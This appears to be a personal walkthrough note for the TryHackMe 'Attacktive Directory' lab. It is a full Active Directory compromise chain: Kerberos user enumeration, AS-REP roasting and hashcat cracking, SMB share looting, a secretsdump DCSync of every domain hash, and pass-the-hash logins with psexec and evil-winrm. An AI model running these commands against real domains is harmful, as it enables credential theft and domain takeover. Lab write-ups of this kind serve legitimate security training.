---
title: "attacktiveDirectory"
tags:
  - fetus
---
## enumeration
#### nmap results:
```sh fold title:"nps"
# Nmap 7.95 scan initiated Sat Oct  4 06:07:39 2025 as: /usr/lib/nmap/nmap -Pn -A -T4 -oN An.txt 10.201.13.241
Nmap scan report for 10.201.13.241
Host is up (0.30s latency).
Not shown: 986 closed tcp ports (reset)
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
80/tcp   open  http          Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
|_http-title: IIS Windows Server
| http-methods: 
|_  Potentially risky methods: TRACE
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-10-04 00:08:12Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: spookysec.local0., Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: spookysec.local0., Site: Default-First-Site-Name)
3269/tcp open  tcpwrapped
3389/tcp open  ms-wbt-server Microsoft Terminal Services
|_ssl-date: 2025-10-04T00:08:57+00:00; +3s from scanner time.
| ssl-cert: Subject: commonName=AttacktiveDirectory.spookysec.local
| Not valid before: 2025-10-02T23:40:33
|_Not valid after:  2026-04-03T23:40:33
| rdp-ntlm-info: 
|   Target_Name: THM-AD
|   NetBIOS_Domain_Name: THM-AD
|   NetBIOS_Computer_Name: ATTACKTIVEDIREC
|   DNS_Domain_Name: spookysec.local
|   DNS_Computer_Name: AttacktiveDirectory.spookysec.local
|   Product_Version: 10.0.17763
|_  System_Time: 2025-10-04T00:08:47+00:00
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.95%E=4%D=10/4%OT=53%CT=1%CU=38330%PV=Y%DS=4%DC=T%G=Y%TM=68E0659
OS:F%P=x86_64-pc-linux-gnu)SEQ(SP=103%GCD=1%ISR=106%TI=I%CI=I%II=I%SS=S%TS=
OS:U)SEQ(SP=105%GCD=1%ISR=109%TI=I%CI=I%II=I%SS=S%TS=U)SEQ(SP=107%GCD=1%ISR
OS:=10B%TI=I%CI=I%II=I%SS=S%TS=U)SEQ(SP=108%GCD=1%ISR=10A%TI=I%CI=I%II=I%SS
OS:=S%TS=U)SEQ(SP=109%GCD=1%ISR=10A%TI=I%CI=I%II=I%SS=S%TS=U)OPS(O1=M509NW8
OS:NNS%O2=M509NW8NNS%O3=M509NW8%O4=M509NW8NNS%O5=M509NW8NNS%O6=M509NNS)WIN(
OS:W1=FFFF%W2=FFFF%W3=FFFF%W4=FFFF%W5=FFFF%W6=FF70)ECN(R=Y%DF=Y%T=80%W=FFFF
OS:%O=M509NW8NNS%CC=Y%Q=)T1(R=Y%DF=Y%T=80%S=O%A=S+%F=AS%RD=0%Q=)T2(R=Y%DF=Y
OS:%T=80%W=0%S=Z%A=S%F=AR%O=%RD=0%Q=)T3(R=Y%DF=Y%T=80%W=0%S=Z%A=O%F=AR%O=%R
OS:D=0%Q=)T4(R=Y%DF=Y%T=80%W=0%S=A%A=O%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=80%W=0%
OS:S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=80%W=0%S=A%A=O%F=R%O=%RD=0%Q=)T7(
OS:R=Y%DF=Y%T=80%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T=80%IPL=164%UN=0
OS:%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=80%CD=Z)

Network Distance: 4 hops
Service Info: Host: ATTACKTIVEDIREC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2025-10-04T00:08:49
|_  start_date: N/A
|_clock-skew: mean: 2s, deviation: 0s, median: 1s

TRACEROUTE (using port 1025/tcp)
HOP RTT       ADDRESS
1   245.03 ms 10.14.0.1
2   ... 3
4   344.56 ms 10.201.13.241

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sat Oct  4 06:09:03 2025 -- 1 IP address (1 host up) scanned in 84.32 seconds
```

```sh fold title:"aps"
# Nmap 7.95 scan initiated Sat Oct  4 06:08:40 2025 as: /usr/lib/nmap/nmap -Pn -A -T4 -p- -oN Aa.txt 10.201.13.241
Nmap scan report for 10.201.13.241
Host is up (0.31s latency).
Not shown: 65508 closed tcp ports (reset)
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
80/tcp    open  http          Microsoft IIS httpd 10.0
|_http-title: IIS Windows Server
|_http-server-header: Microsoft-IIS/10.0
| http-methods: 
|_  Potentially risky methods: TRACE
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-10-04 00:25:02Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: spookysec.local0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: spookysec.local0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
3389/tcp  open  ms-wbt-server Microsoft Terminal Services
| ssl-cert: Subject: commonName=AttacktiveDirectory.spookysec.local
| Not valid before: 2025-10-02T23:40:33
|_Not valid after:  2026-04-03T23:40:33
|_ssl-date: 2025-10-04T00:26:23+00:00; +2s from scanner time.
| rdp-ntlm-info: 
|   Target_Name: THM-AD
|   NetBIOS_Domain_Name: THM-AD
|   NetBIOS_Computer_Name: ATTACKTIVEDIREC
|   DNS_Domain_Name: spookysec.local
|   DNS_Computer_Name: AttacktiveDirectory.spookysec.local
|   Product_Version: 10.0.17763
|_  System_Time: 2025-10-04T00:26:15+00:00
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
9389/tcp  open  mc-nmf        .NET Message Framing
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49669/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49670/tcp open  msrpc         Microsoft Windows RPC
49671/tcp open  msrpc         Microsoft Windows RPC
49672/tcp open  msrpc         Microsoft Windows RPC
49674/tcp open  msrpc         Microsoft Windows RPC
49689/tcp open  msrpc         Microsoft Windows RPC
49698/tcp open  msrpc         Microsoft Windows RPC
49821/tcp open  msrpc         Microsoft Windows RPC
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.95%E=4%D=10/4%OT=53%CT=1%CU=41281%PV=Y%DS=4%DC=T%G=Y%TM=68E069B
OS:6%P=x86_64-pc-linux-gnu)SEQ(SP=104%GCD=1%ISR=10B%TI=I%CI=I%II=I%SS=S%TS=
OS:U)SEQ(SP=104%GCD=1%ISR=10C%TI=I%CI=RD%II=I%SS=S%TS=U)SEQ(SP=10A%GCD=2%IS
OS:R=10D%TI=I%CI=I%II=I%SS=O%TS=U)SEQ(SP=FC%GCD=1%ISR=108%TI=I%CI=I%II=I%SS
OS:=O%TS=U)SEQ(SP=FF%GCD=1%ISR=101%TI=I%CI=I%II=I%SS=S%TS=U)OPS(O1=M509NW8N
OS:NS%O2=M509NW8NNS%O3=M509NW8%O4=M509NW8NNS%O5=M509NW8NNS%O6=M509NNS)WIN(W
OS:1=FFFF%W2=FFFF%W3=FFFF%W4=FFFF%W5=FFFF%W6=FF70)ECN(R=Y%DF=Y%T=80%W=FFFF%
OS:O=M509NW8NNS%CC=Y%Q=)T1(R=Y%DF=Y%T=80%S=O%A=S+%F=AS%RD=0%Q=)T2(R=Y%DF=Y%
OS:T=80%W=0%S=Z%A=S%F=AR%O=%RD=0%Q=)T3(R=Y%DF=Y%T=80%W=0%S=Z%A=O%F=AR%O=%RD
OS:=0%Q=)T4(R=Y%DF=Y%T=80%W=0%S=A%A=O%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=80%W=0%S
OS:=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=80%W=0%S=A%A=O%F=R%O=%RD=0%Q=)T7(R
OS:=Y%DF=Y%T=80%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T=80%IPL=164%UN=0%
OS:RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=80%CD=Z)

Network Distance: 4 hops
Service Info: Host: ATTACKTIVEDIREC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2025-10-04T00:26:18
|_  start_date: N/A
|_clock-skew: mean: 2s, deviation: 0s, median: 1s

TRACEROUTE (using port 8888/tcp)
HOP RTT       ADDRESS
1   194.31 ms 10.14.0.1
2   ... 3
4   289.20 ms 10.201.13.241

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sat Oct  4 06:26:30 2025 -- 1 IP address (1 host up) scanned in 1070.01 seconds
```
#### [[enum4linux]] result:
```sh fold title:"e4lr"
Starting enum4linux v0.9.1 ( http://labs.portcullis.co.uk/application/enum4linux/ ) on Sat Oct  4 06:14:58 2025

[34m =========================================( [0m[32mTarget Information[0m[34m )=========================================

[0mTarget ........... 10.201.13.241
RID Range ........ 500-550,1000-1050
Username ......... ''
Password ......... ''
Known Usernames .. administrator, guest, krbtgt, domain admins, root, bin, none


[34m ===========================( [0m[32mEnumerating Workgroup/Domain on 10.201.13.241[0m[34m )===========================

[0m[33m
[E] [0m[31mCan't find workgroup/domain

[0m

[34m ===============================( [0m[32mNbtstat Information for 10.201.13.241[0m[34m )===============================

[0mLooking up status of 10.201.13.241
No reply from 10.201.13.241

[34m ===================================( [0m[32mSession Check on 10.201.13.241[0m[34m )===================================

[0m[33m
[+] [0m[32mServer 10.201.13.241 allows sessions using username '', password ''

[0m
[34m ================================( [0m[32mGetting domain SID for 10.201.13.241[0m[34m )================================

[0mDomain Name: THM-AD
Domain Sid: S-1-5-21-3591857110-2884097990-301047963
[33m
[+] [0m[32mHost is part of a domain (not a workgroup)

[0m
[34m ==================================( [0m[32mOS information on 10.201.13.241[0m[34m )==================================

[0m[33m
[E] [0m[31mCan't get OS info with smbclient

[0m[33m
[+] [0m[32mGot OS info for 10.201.13.241 from srvinfo: 
[0mdo_cmd: Could not initialise srvsvc. Error was NT_STATUS_ACCESS_DENIED


[34m =======================================( [0m[32mUsers on 10.201.13.241[0m[34m )=======================================

[0m[33m
[E] [0m[31mCouldn't find users using querydispinfo: NT_STATUS_ACCESS_DENIED

[0m
[33m
[E] [0m[31mCouldn't find users using enumdomusers: NT_STATUS_ACCESS_DENIED

[0m
[34m =================================( [0m[32mShare Enumeration on 10.201.13.241[0m[34m )=================================

[0mdo_connect: Connection to 10.201.13.241 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)

	Sharename       Type      Comment
	---------       ----      -------
Reconnecting with SMB1 for workgroup listing.
Unable to connect with SMB1 -- no workgroup available
[33m
[+] [0m[32mAttempting to map shares on 10.201.13.241

[0m
[34m ===========================( [0m[32mPassword Policy Information for 10.201.13.241[0m[34m )===========================

[0m[33m
[E] [0m[31mUnexpected error from polenum:

[0m

[+] Attaching to 10.201.13.241 using a NULL share

[+] Trying protocol 139/SMB...

	[!] Protocol failed: Cannot request session (Called Name:10.201.13.241)

[+] Trying protocol 445/SMB...

	[!] Protocol failed: SAMR SessionError: code: 0xc0000022 - STATUS_ACCESS_DENIED - {Access Denied} A process has requested access to an object but has not been granted those access rights.


[33m
[E] [0m[31mFailed to get password policy with rpcclient

[0m

[34m ======================================( [0m[32mGroups on 10.201.13.241[0m[34m )======================================

[0m[33m
[+] [0m[32mGetting builtin groups:

[0m[33m
[+] [0m[32m Getting builtin group memberships:

[0m[33m
[+] [0m[32m Getting local groups:

[0m[33m
[+] [0m[32m Getting local group memberships:

[0m[33m
[+] [0m[32m Getting domain groups:

[0m[33m
[+] [0m[32m Getting domain group memberships:

[0m
[34m ==================( [0m[32mUsers on 10.201.13.241 via RID cycling (RIDS: 500-550,1000-1050)[0m[34m )==================

[0m[33m
[I] [0m[36mFound new SID: 
[0mS-1-5-21-3591857110-2884097990-301047963
[33m
[I] [0m[36mFound new SID: 
[0mS-1-5-21-3591857110-2884097990-301047963
[33m
[+] [0m[32mEnumerating users using SID S-1-5-21-3591857110-2884097990-301047963 and logon username '', password ''

[0mS-1-5-21-3591857110-2884097990-301047963-500 THM-AD\Administrator (Local User)
S-1-5-21-3591857110-2884097990-301047963-501 THM-AD\Guest (Local User)
S-1-5-21-3591857110-2884097990-301047963-502 THM-AD\krbtgt (Local User)
S-1-5-21-3591857110-2884097990-301047963-512 THM-AD\Domain Admins (Domain Group)
S-1-5-21-3591857110-2884097990-301047963-513 THM-AD\Domain Users (Domain Group)
S-1-5-21-3591857110-2884097990-301047963-514 THM-AD\Domain Guests (Domain Group)
S-1-5-21-3591857110-2884097990-301047963-515 THM-AD\Domain Computers (Domain Group)
S-1-5-21-3591857110-2884097990-301047963-516 THM-AD\Domain Controllers (Domain Group)
S-1-5-21-3591857110-2884097990-301047963-517 THM-AD\Cert Publishers (Local Group)
S-1-5-21-3591857110-2884097990-301047963-518 THM-AD\Schema Admins (Domain Group)
S-1-5-21-3591857110-2884097990-301047963-519 THM-AD\Enterprise Admins (Domain Group)
S-1-5-21-3591857110-2884097990-301047963-520 THM-AD\Group Policy Creator Owners (Domain Group)
S-1-5-21-3591857110-2884097990-301047963-521 THM-AD\Read-only Domain Controllers (Domain Group)
S-1-5-21-3591857110-2884097990-301047963-522 THM-AD\Cloneable Domain Controllers (Domain Group)
S-1-5-21-3591857110-2884097990-301047963-525 THM-AD\Protected Users (Domain Group)
S-1-5-21-3591857110-2884097990-301047963-526 THM-AD\Key Admins (Domain Group)
S-1-5-21-3591857110-2884097990-301047963-527 THM-AD\Enterprise Key Admins (Domain Group)
S-1-5-21-3591857110-2884097990-301047963-1000 THM-AD\ATTACKTIVEDIREC$ (Local User)
[33m
[+] [0m[32mEnumerating users using SID S-1-5-21-3532885019-1334016158-1514108833 and logon username '', password ''

[0mS-1-5-21-3532885019-1334016158-1514108833-500 ATTACKTIVEDIREC\Administrator (Local User)
S-1-5-21-3532885019-1334016158-1514108833-501 ATTACKTIVEDIREC\Guest (Local User)
S-1-5-21-3532885019-1334016158-1514108833-503 ATTACKTIVEDIREC\DefaultAccount (Local User)
S-1-5-21-3532885019-1334016158-1514108833-504 ATTACKTIVEDIREC\WDAGUtilityAccount (Local User)
S-1-5-21-3532885019-1334016158-1514108833-513 ATTACKTIVEDIREC\None (Domain Group)

[34m ===============================( [0m[32mGetting printer info for 10.201.13.241[0m[34m )===============================

[0mdo_cmd: Could not initialise spoolss. Error was NT_STATUS_ACCESS_DENIED


enum4linux complete on Sat Oct  4 06:29:48 2025
```

#### [[kerbrute]] result:
```sh
╭─[~/projects/attacktiveDirectory]─[root@DEMONDAYZ]─[0]─[5572]
╰─[:)] # kerbrute userenum --dc 10.201.13.241 -d THM-AD userlist.txt 

    __             __               __     
   / /_____  _____/ /_  _______  __/ /____ 
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        

Version: v1.0.3 (9dad6e1) - 10/04/25 - Ronnie Flathers @ropnop

2025/10/04 06:54:29 >  Using KDC(s):
2025/10/04 06:54:29 >   10.201.13.241:88

2025/10/04 06:54:29 >  [+] VALID USERNAME:       james@THM-AD
2025/10/04 06:54:35 >  [+] VALID USERNAME:       svc-admin@THM-AD
2025/10/04 06:54:41 >  [+] VALID USERNAME:       James@THM-AD
2025/10/04 06:54:43 >  [+] VALID USERNAME:       robin@THM-AD
2025/10/04 06:55:13 >  [+] VALID USERNAME:       darkstar@THM-AD
2025/10/04 06:55:29 >  [+] VALID USERNAME:       administrator@THM-AD
2025/10/04 06:56:01 >  [+] VALID USERNAME:       backup@THM-AD
2025/10/04 06:56:16 >  [+] VALID USERNAME:       paradox@THM-AD
2025/10/04 06:57:58 >  [+] VALID USERNAME:       JAMES@THM-AD
2025/10/04 06:58:30 >  [+] VALID USERNAME:       Robin@THM-AD
2025/10/04 07:01:54 >  [+] VALID USERNAME:       Administrator@THM-AD
```

- users list:
```sh
svc-admin
backup
James
robin
darkstar
administrator
james
paradox
JAMES
Robin
Administrator
```

 - time to check for ASREPRoasting with [[impacket]]'s GetNPUsers
```sh
GetNPUsers.py THM-AD/svc-admin -no-pass -dc-ip 10.201.88.85
```
- output:
```sh
[*] Getting TGT for svc-admin
/root/.local/bin/GetNPUsers.py:165: DeprecationWarning: datetime.datetime.utcnow() is deprecated and scheduled for removal in a future version. Use timezone-aware objects to represent datetimes in UTC: datetime.datetime.now(datetime.UTC).
  now = datetime.datetime.utcnow() + datetime.timedelta(days=1)
$krb5asrep$23$svc-admin@THM-AD:a984050052216c36aa57fa7467dcc35f$13ab86d922026a6a022a83576b1be01ff61225e116824f3d3eeb9bfc641cd23678180f882fc752a7c60f10282034c5ea1c3f4888fcd88b0048ec8610c3f51b6b57787d0a149c18a6e6b8463b5774f82a499e37830d9dfc4906dae0796e97c04f38796627922f31a8db7a3c0add822c7f12df792c638765ef4ae803a784b2c56d4461f6fc230300c43d3c3fe349896e84d87e56ed98969d7261e57697e5e3862b3a89d7fd9c0ce0093d18122873c639694152ccfac4ba0d966c97416e119946e965c6770988b40f3bbaf46c1d46770fe4488614c57d5c47b70f5783474cc0ff24d0b61cec0b3fa7bd75
```

- the hash is in the `Kerberos 5, etype 23, AS-REP` format 
- hashcat mode: `18200` 
- cracked with [[hashcat]] 
```sh
hashcat -m 18200 hash --wordlist passwordlist.txt
```

- creds:
```sh
svc-admin:management2005
```

- [[smbclient]] output:
```sh
╭─[~/projects/attacktiveDirectory]─[root@DEMONDAYZ]─[1]─[5616]
╰─[:(] # smbclient -L //10.201.116.243 -U 'svc-admin'
Password for [WORKGROUP\svc-admin]:

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        backup          Disk      
        C$              Disk      Default share
        IPC$            IPC       Remote IPC
        NETLOGON        Disk      Logon server share 
        SYSVOL          Disk      Logon server share
```
- [[smbmap]] output:
```sh
smbmap -u svc-admin -p management2005 -H 10.201.116.243

    ________  ___      ___  _______   ___      ___       __         _______
   /"       )|"  \    /"  ||   _  "\ |"  \    /"  |     /""\       |   __ "\
  (:   \___/  \   \  //   |(. |_)  :) \   \  //   |    /    \      (. |__) :)
   \___  \    /\  \/.    ||:     \/   /\   \/.    |   /' /\  \     |:  ____/
    __/  \   |: \.        |(|  _  \  |: \.        |  //  __'  \    (|  /
   /" \   :) |.  \    /:  ||: |_)  :)|.  \    /:  | /   /  \   \  /|__/ \
  (_______/  |___|\__/|___|(_______/ |___|\__/|___|(___/    \___)(_______)
-----------------------------------------------------------------------------
SMBMap - Samba Share Enumerator v1.10.7 | Shawn Evans - ShawnDEvans@gmail.com
                     https://github.com/ShawnDEvans/smbmap

[*] Detected 1 hosts serving SMB                                                                                                  
[*] Established 1 SMB connections(s) and 1 authenticated session(s)                                                          
                                                                                                                             
[+] IP: 10.201.116.243:445      Name: 10.201.116.243            Status: Authenticated
        Disk                   Permissions     Comment
        ----                   -----------     -------
        ADMIN$                 NO ACCESS       Remote Admin
        backup                 READ ONLY
        C$                     NO ACCESS       Default share
        IPC$                   READ ONLY       Remote IPC
        NETLOGON               READ ONLY       Logon server share 
        SYSVOL                 READ ONLY       Logon server share
```
- got access to the `backup` share 
- has `backup_credentials.txt` 
```sh
YmFja3VwQHNwb29reXNlYy5sb2NhbDpiYWNrdXAyNTE3ODYw#
```

- seems like base64 
```sh
base64 -d <<< "YmFja3VwQHNwb29reXNlYy5sb2NhbDpiYWNrdXAyNTE3ODYw" 
backup@spookysec.local:backup2517860
```

- got the backup account creds. cant login with the creds with psexec or [[crackmapexec]] tho
```sh
secretsdump.py THM-AD/backup:backup2517860@10.201.91.87 -dc-ip 10.201.91.87
```

```powershell
[-] RemoteOperations failed: DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied 
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:0e0363213e37b94221497260b0bcb4fc:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:0e2eb8158c27bed09861033026be4c21:::
spookysec.local\skidy:1103:aad3b435b51404eeaad3b435b51404ee:5fe9353d4b96cc410b62cb7e11c57ba4:::
spookysec.local\breakerofthings:1104:aad3b435b51404eeaad3b435b51404ee:5fe9353d4b96cc410b62cb7e11c57ba4:::
spookysec.local\james:1105:aad3b435b51404eeaad3b435b51404ee:9448bf6aba63d154eb0c665071067b6b:::
spookysec.local\optional:1106:aad3b435b51404eeaad3b435b51404ee:436007d1c1550eaf41803f1272656c9e:::
spookysec.local\sherlocksec:1107:aad3b435b51404eeaad3b435b51404ee:b09d48380e99e9965416f0d7096b703b:::
spookysec.local\darkstar:1108:aad3b435b51404eeaad3b435b51404ee:cfd70af882d53d758a1612af78a646b7:::
spookysec.local\Ori:1109:aad3b435b51404eeaad3b435b51404ee:c930ba49f999305d9c00a8745433d62a:::
spookysec.local\robin:1110:aad3b435b51404eeaad3b435b51404ee:642744a46b9d4f6dff8942d23626e5bb:::
spookysec.local\paradox:1111:aad3b435b51404eeaad3b435b51404ee:048052193cfa6ea46b5a302319c0cff2:::
spookysec.local\Muirland:1112:aad3b435b51404eeaad3b435b51404ee:3db8b1419ae75a418b3aa12b8c0fb705:::
spookysec.local\horshark:1113:aad3b435b51404eeaad3b435b51404ee:41317db6bd1fb8c21c2fd2b675238664:::
spookysec.local\svc-admin:1114:aad3b435b51404eeaad3b435b51404ee:fc0f1e5359e372aa1f69147375ba6809:::
spookysec.local\backup:1118:aad3b435b51404eeaad3b435b51404ee:19741bde08e135f4b40f1ca9aab45538:::
spookysec.local\a-spooks:1601:aad3b435b51404eeaad3b435b51404ee:0e0363213e37b94221497260b0bcb4fc:::
ATTACKTIVEDIREC$:1000:aad3b435b51404eeaad3b435b51404ee:0e933d1b92253c382faefe8ce33c206f:::
[*] Kerberos keys grabbed
Administrator:aes256-cts-hmac-sha1-96:713955f08a8654fb8f70afe0e24bb50eed14e53c8b2274c0c701ad2948ee0f48
Administrator:aes128-cts-hmac-sha1-96:e9077719bc770aff5d8bfc2d54d226ae
Administrator:des-cbc-md5:2079ce0e5df189ad
krbtgt:aes256-cts-hmac-sha1-96:b52e11789ed6709423fd7276148cfed7dea6f189f3234ed0732725cd77f45afc
krbtgt:aes128-cts-hmac-sha1-96:e7301235ae62dd8884d9b890f38e3902
krbtgt:des-cbc-md5:b94f97e97fabbf5d
spookysec.local\skidy:aes256-cts-hmac-sha1-96:3ad697673edca12a01d5237f0bee628460f1e1c348469eba2c4a530ceb432b04
spookysec.local\skidy:aes128-cts-hmac-sha1-96:484d875e30a678b56856b0fef09e1233
spookysec.local\skidy:des-cbc-md5:b092a73e3d256b1f
spookysec.local\breakerofthings:aes256-cts-hmac-sha1-96:4c8a03aa7b52505aeef79cecd3cfd69082fb7eda429045e950e5783eb8be51e5
spookysec.local\breakerofthings:aes128-cts-hmac-sha1-96:38a1f7262634601d2df08b3a004da425
spookysec.local\breakerofthings:des-cbc-md5:7a976bbfab86b064
spookysec.local\james:aes256-cts-hmac-sha1-96:1bb2c7fdbecc9d33f303050d77b6bff0e74d0184b5acbd563c63c102da389112
spookysec.local\james:aes128-cts-hmac-sha1-96:08fea47e79d2b085dae0e95f86c763e6
spookysec.local\james:des-cbc-md5:dc971f4a91dce5e9
spookysec.local\optional:aes256-cts-hmac-sha1-96:fe0553c1f1fc93f90630b6e27e188522b08469dec913766ca5e16327f9a3ddfe
spookysec.local\optional:aes128-cts-hmac-sha1-96:02f4a47a426ba0dc8867b74e90c8d510
spookysec.local\optional:des-cbc-md5:8c6e2a8a615bd054
spookysec.local\sherlocksec:aes256-cts-hmac-sha1-96:80df417629b0ad286b94cadad65a5589c8caf948c1ba42c659bafb8f384cdecd
spookysec.local\sherlocksec:aes128-cts-hmac-sha1-96:c3db61690554a077946ecdabc7b4be0e
spookysec.local\sherlocksec:des-cbc-md5:08dca4cbbc3bb594
spookysec.local\darkstar:aes256-cts-hmac-sha1-96:35c78605606a6d63a40ea4779f15dbbf6d406cb218b2a57b70063c9fa7050499
spookysec.local\darkstar:aes128-cts-hmac-sha1-96:461b7d2356eee84b211767941dc893be
spookysec.local\darkstar:des-cbc-md5:758af4d061381cea
spookysec.local\Ori:aes256-cts-hmac-sha1-96:5534c1b0f98d82219ee4c1cc63cfd73a9416f5f6acfb88bc2bf2e54e94667067
spookysec.local\Ori:aes128-cts-hmac-sha1-96:5ee50856b24d48fddfc9da965737a25e
spookysec.local\Ori:des-cbc-md5:1c8f79864654cd4a
spookysec.local\robin:aes256-cts-hmac-sha1-96:8776bd64fcfcf3800df2f958d144ef72473bd89e310d7a6574f4635ff64b40a3
spookysec.local\robin:aes128-cts-hmac-sha1-96:733bf907e518d2334437eacb9e4033c8
spookysec.local\robin:des-cbc-md5:89a7c2fe7a5b9d64
spookysec.local\paradox:aes256-cts-hmac-sha1-96:64ff474f12aae00c596c1dce0cfc9584358d13fba827081afa7ae2225a5eb9a0
spookysec.local\paradox:aes128-cts-hmac-sha1-96:f09a5214e38285327bb9a7fed1db56b8
spookysec.local\paradox:des-cbc-md5:83988983f8b34019
spookysec.local\Muirland:aes256-cts-hmac-sha1-96:81db9a8a29221c5be13333559a554389e16a80382f1bab51247b95b58b370347
spookysec.local\Muirland:aes128-cts-hmac-sha1-96:2846fc7ba29b36ff6401781bc90e1aaa
spookysec.local\Muirland:des-cbc-md5:cb8a4a3431648c86
spookysec.local\horshark:aes256-cts-hmac-sha1-96:891e3ae9c420659cafb5a6237120b50f26481b6838b3efa6a171ae84dd11c166
spookysec.local\horshark:aes128-cts-hmac-sha1-96:c6f6248b932ffd75103677a15873837c
spookysec.local\horshark:des-cbc-md5:a823497a7f4c0157
spookysec.local\svc-admin:aes256-cts-hmac-sha1-96:effa9b7dd43e1e58db9ac68a4397822b5e68f8d29647911df20b626d82863518
spookysec.local\svc-admin:aes128-cts-hmac-sha1-96:aed45e45fda7e02e0b9b0ae87030b3ff
spookysec.local\svc-admin:des-cbc-md5:2c4543ef4646ea0d
spookysec.local\backup:aes256-cts-hmac-sha1-96:23566872a9951102d116224ea4ac8943483bf0efd74d61fda15d104829412922
spookysec.local\backup:aes128-cts-hmac-sha1-96:843ddb2aec9b7c1c5c0bf971c836d197
spookysec.local\backup:des-cbc-md5:d601e9469b2f6d89
spookysec.local\a-spooks:aes256-cts-hmac-sha1-96:cfd00f7ebd5ec38a5921a408834886f40a1f40cda656f38c93477fb4f6bd1242
spookysec.local\a-spooks:aes128-cts-hmac-sha1-96:31d65c2f73fb142ddc60e0f3843e2f68
spookysec.local\a-spooks:des-cbc-md5:e09e4683ef4a4ce9
ATTACKTIVEDIREC$:aes256-cts-hmac-sha1-96:c879a933ea3caba8b1fa28ba7f5189833b1f3c2af1e7ae2c886fe3d67f3dc7fb
ATTACKTIVEDIREC$:aes128-cts-hmac-sha1-96:11a4e329db6b88990ab8540fff8e1862
ATTACKTIVEDIREC$:des-cbc-md5:9d04fbb31657a858
[*] Cleaning up...
```

## exploitation
```sh
psexec.py -debug 'THM-AD/Administrator@10.201.79.129' -hashes  
aad3b435b51404eeaad3b435b51404ee:0e0363213e37b94221497260b0bcb4fc
```

- access through [[evil-winrm]] cuz why not
```sh
evil-winrm -u 'Administrator' -H '0e0363213e37b94221497260b0bcb4fc' -i '10.201.79.129'
```

- loot goblin time with the flags :D